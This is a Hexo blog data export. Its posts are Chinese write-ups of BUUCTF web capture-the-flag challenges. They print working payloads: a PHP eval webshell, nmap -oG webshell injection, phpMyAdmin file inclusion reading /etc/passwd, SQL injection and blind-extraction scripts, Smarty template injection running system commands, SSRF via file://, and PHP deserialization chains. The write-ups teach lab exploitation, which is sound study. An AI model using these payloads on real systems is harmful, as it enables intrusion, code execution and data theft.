{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2018-11-03T12:23:30.000Z","updated":"2021-05-23T11:01:40.931Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"其实向上的路并不拥挤，只是你选择了安逸。 路漫漫其修远兮，吾将上下而求索。"},{"title":"categories","date":"2021-05-23T09:51:42.000Z","updated":"2021-05-23T10:05:14.005Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-05-23T09:51:34.000Z","updated":"2021-05-23T10:04:48.969Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Hello World","slug":"hello-world","date":"2021-05-23T08:55:31.342Z","updated":"2021-05-23T08:55:31.342Z","comments":true,"path":"2021/05/23/hello-world/","link":"","permalink":"http://example.com/2021/05/23/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"buuctf-web-7","slug":"buuctf/buuctf-web-7","date":"2021-05-21T12:06:19.000Z","updated":"2021-05-23T11:05:49.979Z","comments":true,"path":"2021/05/21/buuctf/buuctf-web-7/","link":"","permalink":"http://example.com/2021/05/21/buuctf/buuctf-web-7/","excerpt":"","text":"[GXYCTF2019]BabyUpload [GXYCTF2019]禁止套娃–无参数RCE [BJDCTF2020]The mystery of ip–模板注入 [GXYCTF2019]BabyUpload上传了一个正常jpg图片，居然报错了 接着尝试了png，gif，txt文件，也全都上传失败，上传没有后缀名的也上传失败，这是为毛？？ 看了wp，发现别人是可以上传jpg和png的？？？有毒？ 上传.htaccess文件试试 啊，这，，，看来是题目坏了，总之做法就是，上传.htaccess文件之后，再上传png文件即可。 注意题目过滤了&lt;?，所以使用&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;来绕过。 [GXYCTF2019]禁止套娃 页面啥也没有，查看源码和看了http头啥也没有 扫一下网站后台试试 存在.git泄露问题，用工具下载源码 查看源码 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 是要传入一个exp参数， 这里有三重过滤 1.preg_match(‘/data://|filter://|php://|phar:///i’, $_GET[‘exp’]) 过滤掉php常用的几个伪协议，这样就不能去读取文件了 2.preg_replace(‘/[a-z,_]+((?R)?\\)/‘, NULL, $_GET[‘exp’]) ,用正则来匹配无参数的函数，(?R)?表示递归引用之前的表达式，那么这里只能传入没有参数的函数，像这样的：xxx(xxx(xxx(…))); 3.preg_match(‘/et|na|info|dec|bin|hex|oct|pi|log/i’, $_GET[‘exp’]) 正则匹配掉了et/na/info等关键字，很多函数都用不了 关于无参数RCE，这种时候就需要翻手册了，查找无参数可利用的函数 首先，需要一个浏览目录内的所有文件的函数，这个当然首选：scandir()。当scandir()传入&#39;.&#39;，可以列出当前目录的所有文件 所以如果有函数能够返回&#39;.&#39;的话，就可以利用它作为scandir()的参数 localeconv()函数返回一包含本地数字及货币格式信息的数组 接下来只需要使得指针指向这个数组内的第一个值 current() 函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。 pos() 函数返回数组中的当前元素的值。该函数是 current() 函数的别名。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。 payload：?exp=var_dump(scandir(current(localeconv()))); 接下来看如何读取到flag.php next() 函数将内部指针指向数组中的下一个元素，并输出。 array_reverse() 函数返回翻转顺序的数组。 把数组顺序倒一下，然后使用next()，就可以读到flag了 payload：?exp=show_source(next(array_reverse(scandir(current(localeconv()))))); 参考1 参考2 [GWCTF 2019]我有一个数据库 应该是SQL注入，但是没告诉我们参数以及注入的页面。 用工具扫一下 发现存在phpmyadmin目录，访问一下 可以看到phpmyadmin的版本：4.8.1，搜索一下发现存在任意文件包含漏洞。cve-2018-12613 测试payload：?target=db_datadict.php%253f/../../../../../../../../../etc/passwd 可以成功读取 尝试读取flag ?target=db_datadict.php%253f/../../../../../../../../../flag 我们还可以尝试一下任意代码执行 新建一张数据表 之后插入数据&lt;?php phpinfo();?&gt;，或者执行SQL语句INSERT INTO rce(code) VALUES(&quot;&lt;?php phpinfo(); ?&gt;&quot;); 接下来包含这个文件，但是首先要知道这个文件的路径 可以使用SQL语句来查询：show global variables like &quot;%datadir%&quot;; 接下来包含这个文件 linux中mysql文件的位置 ?target=db_datadict.php%253f/../../../../../../../../../var/lib/mysql/test/test.ibd 不知道为什么找不到文件。。。。。。 [BJDCTF2020]The mystery of ipindex页面 是这样一个页面， flag页面，显示了自己的ip hint页面，页面没有什么信息，但是查看源码有个注释信息 burp抓包看看 题目提示问为什么可以获取到客户端 ip，考虑是 XFF 或 Client-IP 这两个 header，添加X-Forwarded-For: 127.0.0.1之后，显示的ip确实变了， 这里应该是有问题的，测试了SQL注入和命令执行都不行，最后试试SSTI(Server-Side Template Injection)，即服务器端模板注入。 测试一下，是否可以进行逻辑运算&#123;7*8&#125; 接下来试试执行命令&#123;phpinfo();&#125; 发生了报错，是多了和分号;，同时我们也看到这个网站所使用的模板Smarty 接下来去掉分号看看， 接下来是找到flag了 居然不在flag.php里面，接着找 smarty注入payload {if phpinfo()}{/if}{if system(‘ls’)}{/if}{ readfile(‘/flag’) }{if show_source(‘/flag’)}{/if}{if system(‘cat ../../../flag’)}{/if} #本题payload","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"http://example.com/tags/buuctf/"},{"name":"无参数RCE","slug":"无参数RCE","permalink":"http://example.com/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"},{"name":"模板注入","slug":"模板注入","permalink":"http://example.com/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"}]},{"title":"buuctf-web-6","slug":"buuctf/buuctf-web-6","date":"2021-05-20T12:03:03.000Z","updated":"2021-05-23T11:05:57.557Z","comments":true,"path":"2021/05/20/buuctf/buuctf-web-6/","link":"","permalink":"http://example.com/2021/05/20/buuctf/buuctf-web-6/","excerpt":"[GXYCTF2019]BabySQli1–union select特性 [BUUCTF 2018]Online Tool–绕过escapeshellarg、escapeshellcmd [强网杯 2019]高明的黑客–shell脚本筛查 [RoarCTF 2019]Easy Java–WEB-INF配置文件","text":"[GXYCTF2019]BabySQli1–union select特性 [BUUCTF 2018]Online Tool–绕过escapeshellarg、escapeshellcmd [强网杯 2019]高明的黑客–shell脚本筛查 [RoarCTF 2019]Easy Java–WEB-INF配置文件 [GXYCTF2019]BabySQli1 随便输入试试 根据提示不同，可以看到确实是存在admin用户的， 尝试一下注入，开始的时候在pw字段进行注入，但是尝试了很多之后，都提示wrong pass 在name字段进行测试， 发送name=admin’发现有报错， name=admin’的话，提示wrong usr， 所以，应该是单引号字符型注入，尝试了 name=admin’+and+0#&amp;pw=1 报错wrong usr name=admin’+and+1#&amp;pw=1 报错wrong pass and语句被执行了，尝试or，发现or被过滤了，但是Or可以绕过，所以接下来使用Order by来探测列数，发现有三列 接下来使用联合注入，发现括号被过滤了，，，，，，那该怎么办 不会做了，只能百度了。。。。。。 看了wp之后，发现是要利用sql语句的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。 构造payload name=1’+union+select+1,’admin’,’123’#&amp;pw=123 但是还是提示wrong pass 原来是因为，数据库中存储的是MD5，所以要把123的MD5值存进去， name=1’+union+select+1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123 [BUUCTF 2018]Online Tool打开题目，直接给出源码，代码审计 这里涉及到两个函数，具体使用方法如下： escapeshellarg — 把字符串转码为可以在shell命令里使用的参数 escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入shell函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell函数包含 exec(), system() 执行运算符 。 1.确保用户只传递一个参数给命令 2.用户不能指定更多的参数 3.用户不能执行不同的命令 escapeshellcmd — shell 元字符转义 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \\x0A 和 \\xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 1.确保用户只执行一个命令 2.用户可以指定不限数量的参数 3.用户不能执行不同的命令 这两个函数在一起用会有些问题 传入的参数是：172.17.0.2’ -v -d a=1，经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成’172.17.0.2’\\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl ‘172.17.0.2’\\‘’ -v -d a=1&#39;，由于中间的\\被解释为\\而不再是转义字符，所以它后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1’，即向172.17.0.2\\发起请求，POST 数据为a=1’。 简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题，然后往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);这有个system来执行命令，而且有传参，肯定是利用这里了。 这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚 这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\\来转移… 这时候就只有想想能不能利用nmap来做些什么了。 这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件。 这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了 ?host=’ -oG shell.php ‘ 在上面的源码中可以看到，提交之后会返回创建并返回一个文件夹的名称，我们生成的木马就在这个目录下，尝试访问 写入木马：?host=’ -oG shell.php ‘ 蚁剑连接： 测试这两个函数的作用： ‘ -oG shell.php ‘ ‘’&#39;‘ -oG shell.php ‘&#39;‘’ ‘’\\‘’ &lt;?php phpinfo();?&gt; -oG shell.php ‘\\‘’’ 执行命令时：\\ -oG shell.php \\ 注意payload中：没有空格和引号都是不行的。 [强网杯 2019]高明的黑客 看到说源码备份到了www.tar.gz，访问一下，下载下来 解压之后就很奇怪了，有2000多个文件， 随便打开一个看看 可以看到有很多shell，但是看起来都不能使用，但是这些shell中应该有可以使用的，因为文件数量太大，需要写脚本筛查（大佬的脚本）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#encoding=utf-8import osimport requestsimport reimport threadingimport timeprint(&#x27;开始时间： &#x27;+ time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100) #这儿设置最大的线程数filePath = r&quot;C:/Users/17295/Desktop/www/src&quot;os.chdir(filePath) #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # 设置连接活跃状态为Falsedef get_content(file): s1.acquire() print(&#x27;trying &#x27;+file+ &#x27; &#x27;+ time.asctime( time.localtime(time.time()) )) with open(file,encoding=&#x27;utf-8&#x27;) as f: #打开php文件，提取所有的$_GET和$_POST的参数 gets = list(re.findall(&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) posts = list(re.findall(&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) data = &#123;&#125; #所有的$_POST params = &#123;&#125; #所有的$_GET for m in gets: params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot; for n in posts: data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot; url = &#x27;http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/src/&#x27;+file req = session.post(url, data=data, params=params) #一次性请求所有的GET和POST req.close() # 关闭请求 释放内存 req.encoding = &#x27;utf-8&#x27; content = req.text #print(content) if &quot;xxxxxx&quot; in content: #如果发现有可以利用的参数，继续筛选出具体的参数 flag = 0 for a in gets: req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;) content = req.text req.close() # 关闭请求 释放内存 if &quot;xxxxxx&quot; in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;) content = req.text req.close() # 关闭请求 释放内存 if &quot;xxxxxx&quot; in content: break if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0， param = a else: param = b print(&#x27;找到了利用文件： &#x27;+file+&quot; and 找到了利用的参数：%s&quot; %param) print(&#x27;结束时间： &#x27; + time.asctime(time.localtime(time.time()))) s1.release() for i in files: #加入多线程 t = threading.Thread(target=get_content, args=(i,)) t.start() 找到之后payload： [http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag](http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat /flag) [RoarCTF 2019]Easy Java打开题目是一个登录界面 但是我们不知道用户名和密码，但是有个帮助，点击之后 似乎是文件包含，尝试读取/etc/passwd 没有读取到， 百度一下java.io.FileNotFoundException:{help.docx}，说这个是报错，是因为找不到文件路径的问题。但是这里不知道怎么解决，看了wp之后，说是，看到java.io.FileNotFoundException:{help.docx}这个报错，就是要切换请求方式。。。。。。挺迷的，这里是把get变成post。 有个pk文件，应该是可以下载的 就这吗？ 尝试一下包含其他文件， 出现了报错信息 查看了wp 是考察WEB-INF/web.xml泄露 WEB-INF主要包含一下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 漏洞成因： ​ 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！ 接下来我们还是用post的方法，访问WEB-INF/web.xml 将com.wm.ctf.FlagController转化格式，变成WEB-INF/classes/com/wm/ctf/FlagController.class Payload: Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class 将base64解码之后，","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"http://example.com/tags/buuctf/"},{"name":"SQLi","slug":"SQLi","permalink":"http://example.com/tags/SQLi/"},{"name":"java-WEB-INF","slug":"java-WEB-INF","permalink":"http://example.com/tags/java-WEB-INF/"}]},{"title":"buuctf-web-5","slug":"buuctf/buuctf-web-5","date":"2021-05-16T07:23:20.000Z","updated":"2021-05-23T11:06:04.741Z","comments":true,"path":"2021/05/16/buuctf/buuctf-web-5/","link":"","permalink":"http://example.com/2021/05/16/buuctf/buuctf-web-5/","excerpt":"[CISCN2019 华北赛区 Day2 Web1]Hack World1 [极客大挑战 2019]HardSQL1 [网鼎杯 2018]Fakebook1–SSRF","text":"[CISCN2019 华北赛区 Day2 Web1]Hack World1 [极客大挑战 2019]HardSQL1 [网鼎杯 2018]Fakebook1–SSRF [CISCN2019 华北赛区 Day2 Web1]Hack World1 测试输入，id=1，返回Hello, glzjin wants a girlfriend.，id=2时,回显Do you want to be my girlfriend?，&gt;=3的时候是Error Occured When Fetch Result.，尝试单引号，报bool(false)，双引号SQL Injection Checked，被过滤了，包括空格、or、union等都被过滤。 但是在输入id=3/3时，返回Hello, glzjin wants a girlfriend，说明是数字型的sql注入。 id=1/(1)，也可以正常返回，说明括号没有过滤，这样的话很多函数就可以使用， 测试length 可以看到length()是可以正常使用的，测试出的数据库长度为11 接下来，测试数据库名字id=(ascii(substr(database(),1,1))&gt;32) 写一个脚本进行爆库名 123456789101112131415import requestsimport timeurl=&#x27;http://2bb3c1a2-93b6-41de-8204-87b500dce5fd.node3.buuoj.cn/&#x27;db_name=&#x27;&#x27;for i in range(1,12,1):​ for j in range(97,123,1):​ data=&#123;&quot;id&quot;:&quot;(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&quot;.format(i,j)&#125;​ res=requests.post(url,data=data).text​ time.sleep(1)​ #print(j)​ if &#x27;Hello, glzjin wants a girlfriend&#x27; in res:​ db_name=db_name+chr(j)​ print(db_name)​ time.sleep(1)​ break 由于题目直接说了flag在flag中 所以可以直接尝试爆出flag，先进行测试，由于不能用空格，用括号括起来 id=(ascii(substr((select(flag)from(flag)),1,1))&gt;32) id=(ascii(substr((select(flag)from(flag)),1,1))&gt;111) 写脚本爆破 12345678910111213def flag(): f=&quot;&quot; for i in range(1,50,1): for j in range(44,126,1): data=&#123;&quot;id&quot;:&quot;(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(i,j)&#125; res=requests.post(url,data=data).text time.sleep(1) if &#x27;Hello, glzjin wants a girlfriend&#x27; in res: f=f+chr(j) #print(i) print(f) time.sleep(1) Break [极客大挑战 2019]HardSQL1 Sql注入，先试试’和” 发现单引号有报错，双引号没有，没提示有括号，所以应该是普通单引号闭合的字符型注入。 发现如and/空格/union/select/=//**/等都被过滤了 我们试试报错注入 爆库 ?username=1&amp;password=1’or(updatexml(1,concat(0x7e,database(),0x7e),1))%23 爆表 ?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)in(database()))),0x7e),1))%23 等于号不能用，可以使用in或者like 爆列 ?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)in(‘H4rDsq1’))),0x7e),1))%23 查数据 ?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(username,’-‘,password))from(H4rDsq1)),0x7e),1))%23 。。。。。。。只显示了一半，不显示username试试 还是不行。。。。。。 看wp说用right()语句在查询后面部分 这样就可以了 又get到了新技能。。。。 只查到了一半再用left()right()语句查询拼接 ?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))%23 拼接 flag{ad86fce3-d802-4f16-b167-6f587c6298de} [网鼎杯 2018]Fakebook1 查看源码，可以看到有base64的信息 新建了个用户进行简单的测试，可以看到百度的网址是被解析了的，而且在get参数那里可能存在SQL注入，可以试试 单引号 双引号 应该是布尔型 ?no=1 and 1=1 ?no=1 and 1=2 ?no=1 order by 5 经测试一共四列 但是发现union select做了过滤，可以使用union/**/select绕过 可以看到2处会回显 查看数据库?no=-1 union/**/select 1,database(),3,4# 爆表 ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()# 爆列 ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’users’# 查数据 ?no=-1 union/**/select%201,group_concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users# 额、、、、、、没有想象中flag，但是这是我们之前注册时提交的数据经过序列化之后的数据。 看来还是需要其他办法的， 看了网上的wp，扫描一下网站 在robots.txt中可以看到 访问试试，下载得到了源码 12345678910111213function get($url) &#123;​ $ch = curl_init(); //初始化一个curl会话​ curl_setopt($ch, CURLOPT_URL, $url); //设置需要抓取的URL​ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上​ $output = curl_exec($ch); //运行cURL，请求网页​ $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);​ if($httpCode == 404) &#123;​ return 404;​ &#125; curl_close($ch); //关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄​ return $output;&#125; 阅读源码可以看到 输入的blog经过了isValidBlog（）函数的过滤 get()函数存在ssrf漏洞 当调用get方法时会访问某个url得到信息，如果该url被恶意利用，比如利用file协议，就可以读取任意文件。 而在刚刚上面的注出的数据，可以发现得到的数据是进过序列化之后的数据，所以然后尝试利用ssrf漏洞读取flag.php。 构造payload为： /view.php?no=0 union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’ 查看源码，base64解码即可得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"http://example.com/tags/buuctf/"},{"name":"SQLi","slug":"SQLi","permalink":"http://example.com/tags/SQLi/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"}]},{"title":"buuctf-web-4","slug":"buuctf/buuctf-web-4","date":"2021-05-16T04:48:09.000Z","updated":"2021-05-23T11:06:09.811Z","comments":true,"path":"2021/05/16/buuctf/buuctf-web-4/","link":"","permalink":"http://example.com/2021/05/16/buuctf/buuctf-web-4/","excerpt":"[BJDCTF2020]Easy MD51 [极客大挑战 2019]BuyFlag1 [ZJCTF 2019]NiZhuanSiWei1","text":"[BJDCTF2020]Easy MD51 [极客大挑战 2019]BuyFlag1 [ZJCTF 2019]NiZhuanSiWei1 [极客大挑战 2019]BuyFlag1 查看源码可以看到部分源码 Post提交money和password，要求password不能是数字，但又要求password==404， 弱类型比较，所以只需要构造password=404aaa即可 构造报文 回显是已经绕过了前两个验证 但是又说numbers太长了，那我们使用科学计数法表示money money=1e10&amp;password=404aaa [BJDCTF2020]Easy MD51只有一个输入框，随便输入进行测试，看到一个hint select * from ‘admin’ where password=md5($pass,true) md5的语法如下 指定true之后，返回的是16字符的二进制格式 这里又学到新知识了 我们需要找到一个字符串，经过md5加密后返回的字符串能够构造成一个万能密码。 原理： 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。 要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。 当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符） 在网上的wp中看到的字符串****ffifdyop，****经过MD5之后，会变成’or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c， 可以看到真的出来了’or’6，挺神奇的， 拼接成：select * from ‘admin’ where password=’’or’6’ 在输入框中输入ffifdyop，跳转到新的页面 查看源码，发现源码 要求a!=b&amp;&amp;md5(a)==md5(b)，首先这是弱比较，我们可以找两个字符串，经过md5加密后前面的数字是相同的即可，比如： s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 或者使用数组绕过?a[]=1&amp;b[]=2 又出现了新的源码，和上面一样，只不过这次是强等于，但是还是可以使用数组绕过，用post提交 [ZJCTF 2019]NiZhuanSiWei1上来就是源码 Get提交text并且text=welcome to the zjctf，file参数中不能包含/flag/，然后可以包含file，password=unserialize(password) 总体来说就是三个绕过点， 第一个可以使用data://协议 text=data://text/plain,welcome to the zjctf file是需要文件包含，但是不能直接包含flag，提示了一个useless.php文件，我们可以包含这个文件看看，直接file=useless.php看不到源码。伪协议读取 file=php://filter/read=convert.base64-encode/resource=useless.php 第二步的payload： text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo= base64解码之后， 1234567891011121314&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; 我们发现useless.php是一个类，并且提示我们flag在flag.php 明确了文件位置就可以开始构造pop链。 如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。 12345678910111213141516&lt;?phpclass Flag&#123; //flag.php public $file = &quot;flag.php&quot;; public function __tostring()&#123;​ if(isset($this-&gt;file))&#123;​ echo file_get_contents($this-&gt;file);​ echo &quot;&lt;br&gt;&quot;;​ return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);​ &#125; &#125;&#125;$demo = new Flag();$u = serialize($demo);echo $u;?&gt; 得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 构造最终payload ?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 查看源码","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"http://example.com/tags/buuctf/"},{"name":"PHP绕过","slug":"PHP绕过","permalink":"http://example.com/tags/PHP%E7%BB%95%E8%BF%87/"},{"name":"MYSQL比较特性","slug":"MYSQL比较特性","permalink":"http://example.com/tags/MYSQL%E6%AF%94%E8%BE%83%E7%89%B9%E6%80%A7/"}]},{"title":"buuctf_web_2","slug":"buuctf/buuctf-web-2","date":"2021-05-11T13:48:20.000Z","updated":"2021-05-23T11:06:14.890Z","comments":true,"path":"2021/05/11/buuctf/buuctf-web-2/","link":"","permalink":"http://example.com/2021/05/11/buuctf/buuctf-web-2/","excerpt":"[SUCTF 2019]EasySQL [ACTF2020 新生赛]Include [极客大挑战 2019]LoveSQL","text":"[SUCTF 2019]EasySQL [ACTF2020 新生赛]Include [极客大挑战 2019]LoveSQL [SUCTF 2019]EasySQL输入1，正常回显，有值 1’无回显 1”报错，nonono 有三个回显。 试试1’and ‘1’=’1，报nonono 试了order by也不行，试试堆叠注入;show databases;# 接下来;show tables;# 怎么查看Flag呢。。。。 查看大佬们的wp， 输入1显示Array ( [0] =&gt; 1 ) 输入a显示空白 输入所有非0数字都显示Array ( [0] =&gt; 1 ) 输入所有字母（除过滤的关键词外）都显示空白 可以推测题目应该是用了||符号。 推测出题目应该SQL语句是select $_post[value] || flag from Flag。 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。 出现了非预期解 *,1，构造成select *,1 || flag from flag 官方解 1;set sql_mode=PIPES_AS_CONCAT;select 1 构造成select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag， 其中PIPES_AS_CONCAT能将||视为字符串连接符而非或运算符， 实际运行为select 1;set sql_mode=PIPES_AS_CONCAT;select “1”+flag from Flag [ACTF2020 新生赛]Include 1很简单的一个文件包含，直接用php伪协议读取flag.php即可 [极客大挑战 2019]LoveSQL 1是个登陆界面 直接试试万能密码 username=1’ or 1=1#passwd=1 使用admin登录 登录之后还是和上面一样的界面 